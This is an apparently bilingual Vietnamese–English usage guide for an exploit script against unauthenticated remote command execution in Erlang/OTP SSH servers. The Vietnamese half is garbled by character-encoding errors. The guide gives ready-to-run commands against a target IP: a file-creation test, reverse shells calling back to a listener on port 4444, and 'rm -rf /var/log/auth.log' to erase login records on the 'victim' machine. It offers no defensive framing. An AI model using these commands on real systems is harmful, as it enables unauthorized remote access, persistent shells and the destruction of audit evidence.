##VIETNAMESE##

  • ğŸ§  Gá»£i Ã½ sá»­ dá»¥ng:
  • Kiá»ƒm tra tá»‡p táº¡o:

python3 elaina_cve_2025_32433.py 192.168.1.10 22 â€˜touch /tmp/pwned_by_elainaâ€™

  • Reverse shell:

python3 elaina_cve_2025_32433.py 192.168.1.10 22 â€˜bash -i >& /dev/tcp/YOUR_IP/4444 0>&1â€™

  • ğŸ” Ghi chÃº:

    Script khÃ´ng cáº§n SSH key hoáº·c máº­t kháº©u.

Hoáº¡t Ä‘á»™ng trÃªn cÃ¡c phiÃªn báº£n Erlang/OTP SSH server bá»‹ áº£nh hÆ°á»Ÿng (< 27.3.3, < 26.2.5.11, < 25.3.2.20).

Gá»­i Ä‘Ãºng Ä‘á»‹nh dáº¡ng SSH binary message theo RFC4253.

  • ğŸ§± Giáº£i nghÄ©a:

  • touch: lá»‡nh trong Unix/Linux dÃ¹ng Ä‘á»ƒ táº¡o file trá»‘ng.

  • /tmp/pwned_by_elaina: Ä‘Æ°á»ng dáº«n Ä‘áº¿n file cáº§n táº¡o trong thÆ° má»¥c /tmp, nÆ¡i mÃ  háº§u háº¿t há»‡ thá»‘ng Linux Ä‘á»u cho phÃ©p ghi.

  • ğŸ§ª Má»¥c Ä‘Ã­ch dÃ¹ng trong exploit:

  • Khi báº¡n cháº¡y payload:

python3 elaina_cve_2025_32433.py 192.168.1.10 22 â€˜touch /tmp/pwned_by_elainaâ€™
thÃ¬:

  • âœ… Náº¿u khai thÃ¡c thÃ nh cÃ´ng, trÃªn mÃ¡y náº¡n nhÃ¢n sáº½ xuáº¥t hiá»‡n file:

/tmp/pwned_by_elaina
ğŸš« Náº¿u khÃ´ng xuáº¥t hiá»‡n file nÃ y, cÃ³ thá»ƒ payload bá»‹ cháº·n hoáº·c mÃ¡y khÃ´ng bá»‹ áº£nh hÆ°á»Ÿng.

  • ğŸ” Kiá»ƒm tra káº¿t quáº£:

  • Náº¿u báº¡n cÃ³ shell vÃ o mÃ¡y náº¡n nhÃ¢n, kiá»ƒm tra:

ls -l /tmp/pwned_by_elaina

ğŸ“Œ TÃ¹y chá»n khÃ¡c:

  • Báº¡n cÃ³ thá»ƒ thay báº±ng báº¥t ká»³ lá»‡nh nÃ o báº¡n muá»‘n, vÃ­ dá»¥:

  • Gá»­i reverse shell:

bash -i >& /dev/tcp/10.10.14.6/4444 0>&1

  • XÃ³a file log:

rm -rf /var/log/auth.log

ENGLISH

  • ##ğŸ§  Usage suggestions:##

  • Check the generated file:

python3 elaina_cve_2025_32433.py 192.168.1.10 22 â€˜touch /tmp/pwned_by_elainaâ€™

  • Reverse shell:

python3 elaina_cve_2025_32433.py 192.168.1.10 22 â€˜bash -i >& /dev/tcp/YOUR_IP/4444 0>&1â€™

  • ##ğŸ” Note: ##

The script does not require an SSH key or password.

Works on affected Erlang/OTP SSH server versions (< 27.3.3, < 26.2.5.11, < 25.3.2.20).

Send the correct SSH binary message format according to RFC4253.

  • ğŸ§± Explanation:

  • touch: command in Unix/Linux used to create an empty file.

  • /tmp/pwned_by_elaina: path to the file to create in the /tmp directory, where most Linux systems allow writing.

  • ğŸ§ª Purpose of use in exploit:

  • When you run the payload:

python3 elaina_cve_2025_32433.py 192.168.1.10 22 â€˜touch /tmp/pwned_by_elainaâ€™
then:

  • âœ… If the exploit is successful, the file will appear on the victimâ€™s machine:

/tmp/pwned_by_elaina
ğŸš« If this file does not appear, the payload may be blocked or the machine is not affected.

  • ğŸ” Check the result:

  • If you have a shell on the victim machine, check:

ls -l /tmp/pwned_by_elaina

ğŸ“Œ Other options:

  • You can replace it with any command you want, for example:

  • Send a reverse shell:

bash -i >& /dev/tcp/10.10.14.6/4444 0>&1

  • Delete the log file:

rm -rf /var/log/auth.log
